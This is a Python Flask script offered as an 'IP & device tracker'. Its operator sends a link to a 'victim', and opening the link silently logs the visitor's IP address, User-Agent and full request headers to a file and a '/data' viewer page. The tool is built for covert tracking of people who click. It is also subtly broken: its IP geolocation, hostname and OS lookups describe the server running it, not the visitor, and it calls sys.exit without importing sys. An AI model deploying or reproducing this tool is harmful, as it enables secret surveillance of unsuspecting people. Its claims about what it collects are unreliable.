import requests
import socket
import json
import time
import platform
import os
from flask import Flask, request

app = Flask(__name__)

victim_data = []

PORT = int(os.environ.get('PORT', 5000))

def get_device_info():
    info = {}
    
    try:
        info["public_ip"] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        info["public_ip"] = "Unknown"
    
    try:
        ip_info = requests.get(f'http://ip-api.com/json/{info["public_ip"]}', timeout=5).json()
        info["country"] = ip_info.get('country', 'Unknown')
        info["city"] = ip_info.get('city', 'Unknown')
        info["region"] = ip_info.get('regionName', 'Unknown')
        info["isp"] = ip_info.get('isp', 'Unknown')
        info["lat"] = ip_info.get('lat', 'Unknown')
        info["lon"] = ip_info.get('lon', 'Unknown')
        info["timezone"] = ip_info.get('timezone', 'Unknown')
    except:
        info["country"] = "Unknown"
        info["city"] = "Unknown"
        info["region"] = "Unknown"
        info["isp"] = "Unknown"
        info["lat"] = "Unknown"
        info["lon"] = "Unknown"
        info["timezone"] = "Unknown"
    
    try:
        info["local_ip"] = socket.gethostbyname(socket.gethostname())
    except:
        info["local_ip"] = "127.0.0.1"
    
    info["hostname"] = socket.gethostname()
    info["os"] = platform.system()
    info["os_version"] = platform.version()
    info["architecture"] = platform.machine()
    
    return info

@app.route('/')
def index():
    # Get victim info when they open the link
    device_info = get_device_info()
    
    # Get browser info from headers
    device_info["user_agent"] = request.headers.get('User-Agent', 'Unknown')
    device_info["remote_addr"] = request.remote_addr
    device_info["headers"] = dict(request.headers)
    device_info["timestamp"] = time.ctime()
    
    victim_data.append(device_info)
    
    with open("victims_data.json", "a") as f:
        json.dump(device_info, f)
        f.write("\n")
    
    print("\n[+] ===== NEW VICTIM =====")
    print(f"    IP: {device_info.get('public_ip', 'Unknown')}")
    print(f"    Country: {device_info.get('country', 'Unknown')}")
    print(f"    City: {device_info.get('city', 'Unknown')}")
    print(f"    Region: {device_info.get('region', 'Unknown')}")
    print(f"    ISP: {device_info.get('isp', 'Unknown')}")
    print(f"    OS: {device_info.get('os', 'Unknown')}")
    print(f"    Device: {device_info.get('hostname', 'Unknown')}")
    print(f"    User-Agent: {device_info.get('user_agent', 'Unknown')[:50]}...")
    print("="*50)
    
    return "DONE HACKED BY MR404"

@app.route('/data')
def view_data():
    if not victim_data:
        return "No data collected yet"
    
    html = "<html><body style='background:#0a0a0a;color:#00ff00;font-family:monospace;padding:20px;'><h1>VICTIM DATA</h1>"
    for i, data in enumerate(victim_data[-10:]):
        html += f"<div style='border:1px solid #00ff00;padding:10px;margin:10px 0;'><h3>Victim {i+1}</h3>"
        for key, value in data.items():
            if isinstance(value, dict):
                continue
            html += f"<p><strong>{key}:</strong> {str(value)[:200]}</p>"
        html += "</div>"
    html += "</body></html>"
    return html

def main():
    os.system('clear')
    print("""
   >---------------------------------------------<
   _   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( 4 | 0 | 4 |   | I | P |   | T | r | a | c | k | e | r )  
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/
        IP & DEVICE TRACKER
        By Team 404
  >---------------------------------------------<
    """)
    
    print("\n[+] Server is running on port " + str(PORT))
    print("[+] Send this link to the victim")
    print("[+] When victim opens link, data is collected automatically")
    print("[+] Victim sees: DONE HACKED BY MR404")
    print("[+] Data saved in victims_data.json")
    print("[+] Press CTRL+C to stop\n")
    
    app.run(host='0.0.0.0', port=PORT, debug=False)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit(0)